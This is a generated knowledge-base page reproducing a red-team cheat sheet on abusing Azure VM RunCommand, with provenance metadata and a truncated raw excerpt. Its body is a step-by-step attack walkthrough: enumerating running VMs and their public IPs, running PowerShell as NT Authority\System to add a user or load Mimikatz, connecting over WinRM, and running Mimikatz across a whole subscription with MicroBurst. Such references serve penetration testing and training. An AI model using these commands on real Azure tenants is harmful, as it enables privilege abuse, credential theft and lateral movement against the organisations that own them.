---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure Services - Virtual Machine

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-services-virtual-machine` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-virtual-machine.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System

## Preserved Body

````markdown
## RunCommand

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`

**Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`

* List available Virtual Machines

    ```powershell
    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
    ResourceGroupName    Name       
    -----------------    ----       
    TESTRESOURCES        Remote-Test
    ```

* Get Public IP of VM by querying the network interface

    ```powershell
    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
    ```

* Execute Powershell script on the VM, like `adduser`

    ```ps1
    PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
    PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
    ```

* Finally you should be able to connect via WinRM

    ```ps1
    $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
    $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```

Against the whole subscription using `MicroBurst.ps1`

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

## References

* [Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
````

## Source Verification

[source record](../../sources/internalallthethings/azure-services-virtual-machine.md)

## Evidence Excerpt

````text
_body: "# Azure Services - Virtual Machine\n\n## RunCommand\n\n> Allow anyone with \"Contributor\" rights to run PowerShell\
\ scripts on any Azure VM in a subscription as `NT Authority\\System`\n\n**Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`\n\
\n* List available Virtual Machines\n\n    ```powershell\n    PS C:\\> Get-AzureRmVM -status | where {$_.PowerState -EQ\
\ \"VM running\"} | select ResourceGroupName,Name\n    ResourceGroupName    Name       \n    -----------------    ---- \
\      \n    TESTRESOURCES        Remote-Test\n    ```\n\n* Get Public IP of VM by querying the network interface\n\n  \
\  ```powershell\n    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile\n\
\    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>\n    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>\n\
\    ```\n\n* Execute Powershell script on the VM, like `adduser`\n\n    ```ps1\n    PS AzureAD> Invoke-AzVMRunCommand -VMName\
````
